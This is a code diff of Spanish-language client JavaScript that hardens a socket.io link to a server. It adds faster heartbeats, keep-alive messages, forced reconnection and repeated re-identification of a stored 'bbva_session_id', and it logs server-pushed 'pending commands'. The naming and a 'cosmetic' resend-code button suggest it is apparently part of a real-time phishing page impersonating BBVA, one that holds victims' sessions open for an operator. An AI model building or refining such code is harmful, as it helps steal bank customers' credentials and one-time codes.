@@ -105,98 +105,119 @@
             autoConnect: true
         });
 
-        // Get original session ID from storage
         const originalSessionId = localStorage.getItem('bbva_session_id');
         console.log('📂 Session ID recuperado:', originalSessionId);
         let isConnected = false;
+        let reconnectAttempts = 0;
 
-        // Heartbeat y ping
         let heartbeatInterval = null;
         let pingInterval = null;
+        let aliveInterval = null;
 
         function startHeartbeat() {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
             if (pingInterval) clearInterval(pingInterval);
+            if (aliveInterval) clearInterval(aliveInterval);
             
             heartbeatInterval = setInterval(() => {
                 if (socket.connected && originalSessionId) {
                     socket.emit('heartbeat', { sessionId: originalSessionId });
-                    console.log('💓 Heartbeat enviado');
+                    console.log('💓 Heartbeat');
                 }
-            }, 15000);
+            }, 10000);
             
             pingInterval = setInterval(() => {
                 if (socket.connected) {
                     socket.emit('ping-client');
                 } else {
-                    console.log('⚠️ Conexión perdida, reconectando...');
+                    console.log('⚠️ Desconectado! Reconectando...');
+                    reconnectAttempts++;
                     socket.connect();
                 }
-            }, 5000);
+            }, 3000);
+            
+            aliveInterval = setInterval(() => {
+                if (socket.connected) {
+                    socket.emit('client-alive');
+                    console.log('💚 Cliente vivo');
+                }
+            }, 20000);
         }
 
-        // Connection monitoring
         socket.on('connect', () => {
-            console.log('✓ Conectado al servidor. Socket ID:', socket.id);
+            console.log('✅ CONECTADO! Socket ID:', socket.id);
             isConnected = true;
+            reconnectAttempts = 0;
             
-            // Identify with original session
             if (originalSessionId && originalSessionId !== socket.id) {
                 socket.emit('identify-session', { originalSessionId });
-                console.log('🔗 Reidentificando con session original:', originalSessionId);
+                console.log('🔗 Reidentificando:', originalSessionId);
+                setTimeout(() => {
+                    if (socket.connected) {
+                        socket.emit('identify-session', { originalSessionId });
+                        console.log('✅ Doble verificación');
+                    }
+                }, 1000);
             }
-            
             startHeartbeat();
         });
         
         socket.on('session-identified', (data) => {
-            console.log('✅ Sesión identificada:', data);
+            console.log('✅✅ Sesión identificada:', data);
+            if (data.wasPending) {
+                console.log('⏰ Comando pendiente ejecutado');
+            }
         });
 
         socket.on('disconnect', (reason) => {
-            console.log('✗ Desconectado. Razón:', reason);
+            console.log('❌ DESCONECTADO. Razón:', reason);
             isConnected = false;
             if (heartbeatInterval) clearInterval(heartbeatInterval);
             if (pingInterval) clearInterval(pingInterval);
-            
+            if (aliveInterval) clearInterval(aliveInterval);
             setTimeout(() => {
                 if (!socket.connected) {
-                    console.log('🔄 Forzando reconexión...');
+                    console.log('🔄 FORZANDO RECONEXIÓN...');
                     socket.connect();
                 }
-            }, 1000);
+            }, 500);
         });
 
         socket.on('reconnect', (attemptNumber) => {
-            console.log('✅ Reconectado después de', attemptNumber, 'intentos');
+            console.log(`✅✅ RECONECTADO después de ${attemptNumber} intentos`);
             isConnected = true;
+            reconnectAttempts = 0;
             if (originalSessionId) {
                 socket.emit('identify-session', { originalSessionId });
+                setTimeout(() => {
+                    socket.emit('identify-session', { originalSessionId });
+                }, 1000);
             }
             startHeartbeat();
         });
 
         socket.on('reconnecting', (attemptNumber) => {
-            console.log('🔄 Intentando reconectar... Intento #', attemptNumber);
+            if (attemptNumber % 5 === 0) {
+                console.log(`🔄 Intento #${attemptNumber}`);
+            }
         });
 
         socket.on('reconnect_error', (error) => {
-            console.error('✗ Error al reconectar:', error.message);
+            console.error('✗ Error al reconectar');
         });
 
         socket.on('connect_error', (error) => {
-            console.error('✗ Error de conexión:', error.message);
+            console.error('✗ Error de conexión');
+            setTimeout(() => socket.connect(), 1000);
         });
 
-        socket.on('pong', () => {
-            console.log('🏓 Pong recibido');
-        });
+        socket.on('pong', () => {});
         
-        socket.on('pong-client', (data) => {
-            console.log('🏓 Pong-client:', new Date(data.timestamp).toLocaleTimeString());
-        });
+        socket.on('pong-client', (data) => {});
         
-        socket.on('ping-all', () => socket.emit('pong'));
+        socket.on('server-ping', () => {
+            socket.emit('client-alive');
+        });
 
         // Form functionality
         
@@ -278,6 +299,7 @@
         window.addEventListener('beforeunload', () => {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
             if (pingInterval) clearInterval(pingInterval);
+            if (aliveInterval) clearInterval(aliveInterval);
         });
 
         // Resend code (cosmetic)
